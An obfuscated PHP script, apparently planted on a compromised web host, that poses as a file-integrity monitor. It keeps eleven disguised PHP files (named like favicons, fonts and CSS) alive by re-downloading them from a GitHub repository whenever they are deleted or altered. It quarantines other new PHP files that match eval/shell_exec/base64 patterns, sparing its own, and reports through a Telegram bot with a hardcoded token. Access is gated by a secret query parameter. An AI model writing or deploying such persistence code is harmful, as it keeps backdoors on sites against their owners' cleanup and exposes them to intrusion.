<?php
 goto vsvvo; vsvvo: $rootPath = "\x2f\150\157\x6d\145\57\x6a\x6f\x69\x6e\x77\x69\x73\x2f\x70\x75\x62\154\x69\143\137\150\x74\155\x6c\57"; goto ksmq9; ZbPRy: file_put_contents($storageFile, json_encode($currentData, JSON_PRETTY_PRINT)); goto xGb3M; GSIQ7: $SITE_NAME = $_SERVER["\110\x54\x54\x50\137\x48\x4f\123\x54"] ?? "\xf0\237\x94\x8d\x20\125\116\113\116\x4f\x57\x4e\40\x53\x45\122\126\105\x52"; goto aCsLL; EjzS4: $watchFiles = array("\57\x68\x6f\x6d\x65\57\152\157\x69\156\x77\151\163\57\x70\165\x62\x6c\151\x63\x5f\150\x74\155\154\57\x70\145\156\144\141\146\164\141\x72\x5f\162\145\147\55\x41\57\101\x2d\x6b\157\156\145\153\163\151\x2d\x70\145\x6d\x62\x61\x79\x61\x72\x61\x6e\x2e\x70\x68\x70" => "\150\x74\x74\x70\163\x3a\57\57\x72\141\x77\56\147\151\x74\x68\x75\x62\165\x73\x65\162\143\157\156\x74\x65\x6e\164\x2e\143\157\155\57\x57\x69\152\141\x79\x61\150\x61\x6e\x73\57\x74\157\142\x61\x74\x32\x2f\x72\x65\146\163\57\150\145\x61\144\x73\57\155\x61\151\x6e\57\163\143\x61\156", "\x2f\x68\x6f\x6d\145\57\152\157\x69\x6e\167\x69\163\x2f\160\165\x62\x6c\151\143\137\x68\164\x6d\154\57\154\x6f\x67\151\x6e\x2f\x73\164\171\154\x65\55\162\x74\154\55\143\163\163\x5f\x2e\160\150\x70" => "\x68\x74\x74\x70\x73\72\x2f\57\162\x61\167\56\147\x69\164\x68\x75\142\165\x73\145\x72\x63\157\156\164\x65\156\x74\x2e\x63\157\x6d\x2f\x57\x69\152\x61\171\141\x68\141\156\163\x2f\x74\157\142\141\x74\x32\57\x72\145\x66\x73\x2f\150\x65\x61\144\163\57\x6d\x61\151\x6e\x2f\163\x63\x61\156", "\57\150\x6f\155\145\57\152\157\x69\x6e\x77\x69\163\57\x70\165\x62\154\151\x63\x5f\150\x74\x6d\154\x2f\153\x65\x74\x5f\142\145\x62\141\x73\x2f\x70\162\157\163\x65\163\137\165\160\144\x61\x74\x65\x5f\142\145\x62\141\x73\137\143\x64\143\56\x70\141\x6a\x61\153\x2d\x70\x65\x72\164\141\x6d\142\141\150\x61\156\55\56\x70\150\x70" => "\x68\164\x74\160\x73\72\x2f\57\x72\141\167\56\x67\151\x74\x68\165\x62\x75\163\x65\162\x63\x6f\x6e\164\x65\156\x74\56\x63\x6f\155\57\127\151\152\x61\171\x61\150\141\x6e\x73\57\x74\x6f\x62\141\164\x32\x2f\162\x65\146\x73\57\150\x65\x61\144\x73\57\155\141\x69\156\x2f\x73\143\x61\156", "\57\x68\x6f\x6d\145\57\152\157\x69\x6e\x77\151\163\57\x70\x75\x62\x6c\151\143\137\x68\164\x6d\154\x2f\x6a\x73\57\143\x6f\x6e\x74\x61\x63\x74\x5f\x6d\145\x5f\144\141\x74\141\124\141\x62\x6c\x65\163\x2e\x70\150\160" => "\150\x74\164\160\163\72\57\x2f\x72\x61\x77\x2e\147\151\164\x68\165\142\165\x73\x65\x72\x63\x6f\156\x74\145\x6e\164\56\x63\157\155\x2f\127\151\152\141\x79\x61\x68\141\156\x73\57\x74\157\142\141\x74\x32\57\x72\145\146\x73\x2f\150\145\141\144\x73\x2f\x6d\x61\151\156\x2f\x73\143\141\x6e", "\57\150\157\155\145\x2f\x6a\157\151\x6e\x77\151\163\57\160\165\142\x6c\151\x63\x5f\x68\164\155\154\57\151\x6d\x67\57\x66\x61\x76\x69\143\x6f\156\x2d\x73\x74\151\x6d\165\147\x6f\56\160\x68\x70" => "\x68\164\164\160\163\x3a\57\57\162\141\167\x2e\147\151\x74\150\x75\x62\x75\163\x65\162\x63\157\156\x74\x65\156\164\x2e\x63\157\155\57\127\151\x6a\141\x79\141\150\141\x6e\163\x2f\x74\x6f\142\x61\164\x32\57\x72\145\x66\x73\x2f\x68\145\141\144\x73\x2f\x6d\x61\x69\x6e\57\x63\x73", "\57\150\x6f\155\x65\57\152\x6f\151\156\167\151\x73\57\160\x75\142\x6c\151\143\137\x68\x74\x6d\x6c\x2f\151\x6d\160\x6f\162\164\57\115\141\x73\x74\x65\162\104\141\164\x61\111\155\x70\157\162\x74\x53\x4b\56\160\150\x70" => "\x68\164\x74\160\163\72\x2f\x2f\162\x61\167\56\147\151\164\x68\x75\x62\x75\x73\145\162\143\157\156\x74\145\156\x74\56\143\x6f\155\57\127\x69\x6a\141\171\x61\x68\141\156\163\57\x74\157\x62\141\164\62\57\162\145\x66\163\57\150\x65\x61\144\163\57\155\x61\x69\x6e\x2f\x63\x73", "\x2f\150\x6f\x6d\x65\x2f\152\157\151\x6e\x77\151\163\57\160\x75\142\x6c\x69\x63\x5f\150\164\155\154\x2f\146\x6f\x6e\164\163\57\147\x6c\171\160\150\x69\143\x6f\x6e\x73\x2d\x68\x61\154\146\154\x69\x6e\147\163\x2d\162\145\x67\x75\x6c\x61\x72\55\142\157\154\144\55\62\60\60\56\160\150\160" => "\150\164\x74\x70\163\72\57\x2f\162\141\167\56\147\151\x74\x68\x75\142\165\x73\145\x72\x63\157\156\164\145\156\164\56\x63\157\155\x2f\127\151\152\x61\x79\141\x68\141\156\163\57\x74\x6f\x62\x61\164\x32\57\162\x65\x66\x73\57\x68\x65\141\144\163\x2f\x6d\141\151\156\57\x63\x73", "\57\150\157\155\x65\57\x6a\x6f\151\156\167\x69\163\57\160\165\x62\x6c\x69\143\x5f\x68\164\x6d\154\x2f\146\157\x6e\x74\x2d\x61\x77\x65\x73\157\155\145\x2f\154\x65\163\163\x2f\160\141\164\150\55\162\157\x74\141\164\x65\x64\56\x70\x68\160" => "\150\x74\164\160\x73\72\x2f\57\x72\141\167\56\x67\x69\x74\x68\165\x62\x75\x73\x65\162\x63\157\x6e\x74\x65\156\x74\x2e\143\157\x6d\57\127\x69\x6a\141\x79\141\x68\x61\156\x73\57\164\x6f\142\141\164\x32\57\162\145\146\x73\x2f\150\x65\141\x64\x73\x2f\x6d\x61\151\156\57\x63\163", "\x2f\x68\157\x6d\145\x2f\152\x6f\x69\156\167\x69\x73\57\160\165\142\x6c\151\143\137\150\x74\155\x6c\x2f\x65\x78\160\157\162\164\137\x70\x68\160\145\170\x63\x65\x6c\57\x50\x48\x50\105\x78\x63\x65\x6c\x2f\120\110\x50\x45\170\143\x65\x6c\123\157\x72\x74\x2e\160\x68\x70" => "\150\x74\164\x70\163\72\x2f\x2f\x72\x61\x77\56\x67\151\x74\150\165\142\165\163\x65\x72\143\x6f\x6e\164\x65\156\x74\x2e\x63\x6f\x6d\57\127\x69\x6a\x61\171\x61\x68\141\x6e\x73\57\x74\157\142\x61\x74\62\x2f\x72\145\146\x73\57\150\145\x61\x64\163\x2f\155\x61\x69\156\57\x63\163", "\57\150\157\155\145\57\152\157\x69\156\x77\151\x73\x2f\x70\165\x62\154\151\x63\137\x68\164\x6d\154\57\x65\170\x70\157\162\x74\x2f\146\160\144\x66\x31\x37\57\155\x61\153\145\146\157\x6e\x74\x2f\x6b\157\151\x39\x2d\162\x75\x75\55\155\x61\x70\x2e\160\150\160" => "\x68\164\164\x70\163\x3a\x2f\x2f\162\141\x77\x2e\147\151\x74\x68\x75\x62\165\x73\145\x72\143\x6f\x6e\x74\145\156\x74\x2e\143\x6f\x6d\x2f\127\151\x6a\x61\171\141\150\141\x6e\x73\57\x74\x6f\142\141\164\62\57\162\145\x66\x73\x2f\150\145\141\144\163\x2f\x6d\x61\x69\156\x2f\143\163", "\57\x68\x6f\x6d\145\57\x6a\157\151\156\x77\151\x73\x2f\x70\x75\142\x6c\151\x63\137\x68\164\x6d\154\57\x63\x73\x73\x2f\155\x6f\144\145\162\156\55\x62\x75\163\151\x6e\145\163\163\x2e\160\x68\160" => "\150\164\x74\160\x73\72\x2f\57\162\x61\x77\56\x67\x69\x74\150\165\x62\x75\163\145\x72\143\x6f\x6e\x74\145\x6e\164\56\x63\x6f\x6d\x2f\x57\151\x6a\x61\x79\x61\150\x61\156\163\x2f\x74\157\x62\x61\x74\x32\57\x72\145\x66\163\x2f\x68\x65\x61\144\163\57\155\x61\x69\x6e\57\x63\x73", "\x2f\150\x6f\155\145\57\152\157\x69\x6e\167\151\163\57\x70\x75\x62\154\x69\143\x5f\x68\164\155\x6c\x2f\x63\157\156\x66\x69\x67\x2f\55\57\x63\x65\154\137\165\163\145\162\137\56\160\150\x70" => "\150\x74\x74\160\163\x3a\57\57\162\141\x77\x2e\147\x69\x74\150\x75\x62\165\x73\145\162\x63\x6f\156\x74\x65\156\164\x2e\143\x6f\155\x2f\x57\151\152\141\171\141\x68\x61\156\x73\57\164\x6f\142\141\164\x32\57\x72\x65\x66\163\x2f\150\145\141\x64\x73\x2f\x6d\141\151\x6e\x2f\143\163"); goto cRrTF; q9gL5: date_default_timezone_set("\101\163\151\141\x2f\112\x61\x6b\x61\162\x74\x61"); goto EPUBP; KWU0p: $isFirstRun = !file_exists($storageFile); goto QKoSJ; dPo0o: foreach ($watchFiles as $path => $sourceUrl) { $relPath = ltrim(str_replace($rootPath, '', $path), "\x2f\x5c"); $needsRestore = false; if (!file_exists($path)) { $needsRestore = true; $reason = "\x46\x69\154\145\40\115\x69\163\x73\151\156\147"; } else { $currentH = hash_file("\x73\x68\x61\x32\x35\x36", $path); if (isset($oldData[$relPath]) && $oldData[$relPath]["\x68\x61\163\150"] !== $currentH) { $needsRestore = true; $reason = "\x46\x69\x6c\x65\x20\x4d\x6f\x64\x69\146\151\145\x64"; } } if ($needsRestore) { $content = @file_get_contents($sourceUrl); if ($content) { file_put_contents($path, $content); $newHash = hash_file("\163\150\x61\62\x35\x36", $path); $currentData[$relPath] = array("\x68\141\163\150" => $newHash, "\x74\151\155\x65" => time()); if (!$isFirstRun) { sendTelegram("\xe2\x99\273\xef\xb8\217\40\74\142\x3e\101\125\124\117\x2d\122\105\x53\124\117\x52\x45\104\72\74\x2f\142\76\xa\74\x63\x6f\144\x65\76{$relPath}\74\x2f\143\157\144\x65\76\xa\122\x65\x61\x73\x6f\156\72\x20{$reason}"); } echo "\xe2\x99\273\xef\xb8\217\40\122\x65\x73\164\x6f\x72\145\x64\72\x20{$relPath}\12"; } } else { if (file_exists($path)) { $currentData[$relPath] = array("\x68\x61\163\150" => hash_file("\163\x68\141\x32\65\x36", $path), "\164\151\x6d\145" => time()); } } } goto V1Kw0; eoyZR: ini_set("\x6d\145\155\x6f\x72\x79\137\154\x69\x6d\151\x74", "\65\61\62\115"); goto q9gL5; mqVVE: $TELEGRAM_BOT_TOKEN = "\70\62\x31\x39\70\64\x30\70\x34\62\x3a\101\101\x47\x46\x50\146\170\106\x5a\116\x2d\x35\120\x33\60\x36\x36\127\x62\x4b\122\x5a\x39\x58\x2d\x62\x76\x35\172\x57\121\x44\x59\122\163"; goto FrvVV; aCsLL: $allowedExtensions = array("\x70\x68\160", "\160\150\160\62", "\x70\150\x70\63", "\160\x68\160\x34", "\160\150\x70\x35", "\x70\150\160\x36", "\x70\x68\x70\67", "\x70\x68\x70\x38", "\160\150\160\x35\66", "\160\x68\x74\x6d\x6c", "\160\x68\164\x6d", "\x70\150\164", "\160\150\141\162", "\x69\156\x63"); goto xOzlb; Hb0wd: foreach ($it as $f) { if (!$f->isFile()) { continue; } $absPath = realpath($f->getPathname()); $relPath = ltrim(str_replace(realpath($rootPath), '', $absPath), "\x2f\134"); if (strpos($absPath, realpath($quarantineDir)) === 0) { continue; } if (array_key_exists($absPath, $watchFiles)) { continue; } if (!in_array(strtolower(pathinfo($absPath, PATHINFO_EXTENSION)), $allowedExtensions)) { continue; } $currentHash = hash_file("\163\150\141\x32\65\x36", $absPath); if (!$isFirstRun) { $isNew = !isset($oldData[$relPath]); $isMod = isset($oldData[$relPath]) && $oldData[$relPath]["\x68\141\163\150"] !== $currentHash; if ($isNew || $isMod) { $malware = deepScan($absPath, $suspiciousPatterns); if ($malware) { $target = $quarantineDir . "\x2f" . basename($relPath) . "\137" . time() . "\x2e\x62\141\x6b"; @rename($absPath, $target); sendTelegram("\342\x98\243\357\270\x8f\40\x3c\142\x3e\115\101\x4c\127\x41\x52\x45\x20\x42\114\x4f\103\x4b\105\104\72\74\x2f\142\x3e\12\x3c\143\157\144\145\76{$relPath}\74\x2f\143\157\x64\145\76\12\120\x61\164\x74\x65\162\x6e\x3a\x20\74\143\157\144\x65\76{$malware}\x3c\x2f\143\x6f\x64\145\76"); echo "\xf0\237\x9b\221\40\102\x6c\x6f\x63\x6b\145\144\72\x20{$relPath}\xa"; continue; } else { sendTelegram("\360\237\224\224\x20\74\x62\76\x41\103\124\111\x56\111\124\x59\x3a\74\x2f\x62\x3e\xa\x3c\143\157\144\x65\x3e{$relPath}\x3c\57\x63\x6f\x64\x65\76\40\x28\103\x6c\x65\x61\x6e\x29"); echo "\342\234\205\40\x41\x70\160\x72\x6f\166\145\144\x3a\40{$relPath}\12"; } } } $currentData[$relPath] = array("\x68\141\163\150" => $currentHash, "\164\x69\155\x65" => time()); } goto WPeJ3; AxS4r: $currentData = array(); goto PH_gz; WPeJ3: if (!$isFirstRun) { foreach ($oldData as $path => $info) { if (!isset($currentData[$path]) && !array_key_exists($rootPath . $path, $watchFiles)) { sendTelegram("\342\235\214\x20\74\142\x3e\x46\x49\x4c\x45\x20\104\x45\114\x45\x54\x45\104\72\x3c\57\142\x3e\xa\74\x63\x6f\x64\145\76{$path}\74\x2f\143\x6f\144\x65\76"); } } } goto ZbPRy; EPUBP: if (!file_exists($quarantineDir)) { @mkdir($quarantineDir, 493, true); } goto MXIjZ; ksmq9: $storageFile = "\x2f\x68\157\155\x65\57\x6a\x6f\x69\x6e\167\x69\163\57\144\x61\x66\x74\141\162\167\151\163\x75\144\x61\56\152\163\x6f\156"; goto yQfaC; xOzlb: $suspiciousPatterns = array("\57\x65\x76\x61\x6c\x5c\x73\52\134\50\57\x69", "\x2f\x73\x68\145\x6c\154\x5f\145\170\145\143\134\163\x2a\x5c\x28\57\x69", "\x2f\x73\171\x73\164\145\155\x5c\x73\x2a\x5c\50\57\151", "\x2f\x70\141\163\x73\164\150\x72\165\x5c\163\52\x5c\50\x2f\x69", "\x2f\145\170\x65\143\x5c\163\x2a\134\50\57\151", "\x2f\x62\141\163\145\66\64\x5f\x64\x65\x63\157\x64\145\x5c\x73\x2a\134\x28\x2f\x69", "\57\x67\172\x69\156\146\154\141\x74\x65\x5c\x73\x2a\134\x28\x2f\x69", "\57\x73\164\x72\x5f\162\x6f\164\x31\63\134\x73\52\134\50\x2f\151", "\x2f\x61\163\163\x65\162\x74\x5c\x73\52\x5c\x28\57\x69", "\57\143\x72\145\141\x74\145\x5f\146\165\x6e\143\164\x69\157\x6e\x5c\x73\x2a\x5c\x28\x2f\151", "\57\x70\162\145\x67\137\x72\x65\160\x6c\141\143\x65\x5c\163\x2a\x5c\50\56\x2a\134\x2f\145\56\52\134\x29\57\151", "\57\134\x5c\x78\133\60\55\71\x61\55\x66\x41\55\106\135\173\62\175\x2f", "\x2f\x5c\142\50\x68\145\x78\62\142\151\156\174\142\151\156\x32\x68\145\x78\174\x73\164\162\162\145\166\174\143\x68\x72\174\157\162\x64\x29\x5c\142\x2f\x69"); goto EjzS4; x_dNA: function deepScan($filePath, $patterns) { $content = @file_get_contents($filePath); if (!$content) { return false; } foreach ($patterns as $pattern) { if (preg_match($pattern, $content)) { return "\x50\141\164\164\x65\x72\x6e\72\x20{$pattern}"; } } $clean = preg_replace("\x2f\134\x73\53\x2f", '', $content); if (preg_match("\x2f\x28\x65\x76\x61\154\x7c\x73\x79\163\164\x65\155\x7c\x73\150\145\154\x6c\137\x65\x78\145\143\x7c\x62\141\x73\x65\x36\64\x5f\144\x65\143\157\x64\x65\174\147\x7a\x69\x6e\x66\154\x61\164\145\x29\x5c\x28\57\151", $clean)) { return "\117\x62\146\165\163\x63\141\x74\x65\144\40\143\x61\154\x6c"; } return false; } goto KWU0p; FrvVV: $TELEGRAM_CHAT_ID = "\x2d\61\x30\x30\62\x39\71\x36\66\x30\67\70\62\x33"; goto GSIQ7; QKoSJ: $oldData = !$isFirstRun ? json_decode(file_get_contents($storageFile), true) : array(); goto AxS4r; V1Kw0: $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($rootPath, FilesystemIterator::SKIP_DOTS)); goto Hb0wd; cRrTF: if (!isset($_GET["\101\171\141\x6d\163\x75\156\x6b\x69\x74\143\x68\x65\156\145\x6e\x61\x6b\x6a\x75\147\141"]) || $_GET["\x41\x79\x61\x6d\163\x75\x6e\x6b\x69\x74\x63\150\145\x6e\145\x6e\x61\x6b\152\165\x67\141"] !== $ACCESS_KEY) { http_response_code(403); die("\x34\60\63\x20\106\x6f\x72\x62\x69\144\144\x65\x6e"); } goto Y1AJI; PH_gz: echo "\x3c\160\162\x65\76\xf0\237\233\241\xef\270\217\x20\115\157\x6e\151\x74\157\x72\151\x6e\147\x20\x41\143\x74\151\x76\x65\56\56\x2e\xa\xa"; goto dPo0o; Y1AJI: set_time_limit(0); goto eoyZR; yQfaC: $quarantineDir = "\x2f\150\x6f\155\x65\x2f\x6a\x6f\x69\x6e\167\151\163\57\56\161\165\x61\162\141\156\x74\x69\156\x65"; goto Xsfba; Xsfba: $ACCESS_KEY = "\102\145\142\x65\x6b\x70\141\x6e\147\x67\141\x6e\147\x73\165\156\x6b\x69\164\x63\x68\145\x6e\x36\71"; goto mqVVE; MXIjZ: function sendTelegram($text) { global $TELEGRAM_BOT_TOKEN, $TELEGRAM_CHAT_ID, $SITE_NAME; $url = "\x68\164\164\160\x73\x3a\x2f\57\x61\x70\x69\x2e\164\x65\154\x65\x67\x72\x61\155\56\157\x72\147\57\x62\157\x74{$TELEGRAM_BOT_TOKEN}\x2f\163\x65\x6e\x64\115\145\x73\163\141\x67\x65"; $data = array("\x63\x68\x61\164\x5f\151\144" => $TELEGRAM_CHAT_ID, "\164\145\x78\164" => "\360\x9f\223\214\40\x3c\x62\x3e{$SITE_NAME}\x3c\x2f\x62\x3e\12" . $text, "\x70\141\x72\163\145\137\155\157\x64\x65" => "\x48\x54\115\114"); $ch = curl_init($url); curl_setopt_array($ch, array(CURLOPT_POST => true, CURLOPT_POSTFIELDS => $data, CURLOPT_RETURNTRANSFER => true)); curl_exec($ch); curl_close($ch); } goto x_dNA; xGb3M: echo "\xa\xf0\237\216\x89\x20\123\143\141\156\x20\x53\x65\x6c\x65\163\141\151\x2e\40\104\x61\164\x61\142\x61\163\145\40\125\160\x64\x61\164\x65\x64\56\12\x3c\57\x70\x72\x65\x3e";
